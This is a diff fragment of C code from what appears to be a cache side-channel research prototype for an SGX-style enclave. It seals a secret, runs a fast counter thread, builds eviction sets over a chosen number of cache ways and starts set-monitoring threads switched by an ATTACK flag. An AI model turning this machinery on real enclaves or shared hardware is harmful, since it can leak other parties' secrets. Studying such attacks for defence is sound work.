+    stack = (char *)(thread_data->first_ssa_gpr);
+    regs[20] = 0;
+    timeini = 0;
+    //stack[160]=0;
+    /*     for(i=0;i<23;i++)
+    {
+        printf("Saved gpr: %i %zx \n",i,regs[i]);
+        printf("Char gpr: %i %x \n",i,stack[160+i]);
+        stack[160]=0;
+        stack[161]=0;
+        regs[20]=0;
+        //regs[i]=0;
+    }
+    //regs[18]=0;
+    //(*stack)=0;
+    printf("Saved gpr: %zx \n", regs[18]);
+    thread_data = get_thread_data();
+    regs = (size_t*)(thread_data->first_ssa_gpr); */
+
+    // Ensure the counter is running
+    if (!(check_running()))
+        pthread_create(&counter_task, NULL, fast_counter, NULL);
+    //Assign the secret
+    if (assign_secret(&sealed_data, &data_size) == 0)
+    {
+        printf("Data size %u \n", data_size);
+        ocall_save_sealed_data(&sealed_data, data_size);
+    }
+    if (!(check_ready()))
+    {
+        gen_plot(30);
+        //gen_tlb();
+        pthread_mutex_lock(&mutex_start);
+        while (!(check_ready()))
+        {
+            pthread_cond_wait(&condp, &mutex_start);
+        }
+        pthread_mutex_unlock(&mutex_start);
+        //pthread_create(&monitor_task, NULL, monitor_sets, NULL);
+        pthread_create(&monitor_task, NULL, monitor_sets_old, NULL);
+    }
+    increase_counter();
+    long int examp = global_counter;
+    printf("Hello World %i \n", (int8_t)secret_data[0]);
+    printf("Counter %li %li\n", global_counter, examp);
+    /*     pthread_cancel(counter_task);
+    pthread_mutex_lock(&global_mutex);
+    monitor_running = 0;
+    pthread_mutex_unlock(&global_mutex); */
+}
+
+void printfile_measurements(int *ways)
+{
+    // Ensure the counter is running
+    //if (!(check_running()))
+    //    pthread_create(&counter_task, NULL, fast_counter, NULL);
+    int inter = (*(ways));
+    if ((inter > CACHE_SET_SIZE) || (inter < 3))
+    {
+        inter = CACHE_SET_SIZE;
+    }
+    //pthread_cancel(monitor_task);
+    printf("Pre measurements %i\n", inter);
+    pthread_mutex_lock(&mutex_start);
+    while (!(check_sampler()))
+    {
+        pthread_cond_wait(&condSets, &mutex_start);
+    }
+    pthread_mutex_unlock(&mutex_start);
+    if (mon_ways != inter)
+    {
+        mon_ways = inter;
+        printf("New ways %d \n", mon_ways);
+        build_ev_set(OFFSET, eviction_set, eviction_set_1, final_eviction_set, mon_ways);
+    }
+    printf("New measurements \n");
+    if (ATTACK)
+    {
+	pthread_create(&monitor_task, NULL, monitor_sets_old, NULL);
+    }
+    else{
+    	pthread_create(&monitor_task, NULL, monitor_sets_file, NULL);
+    }
+}
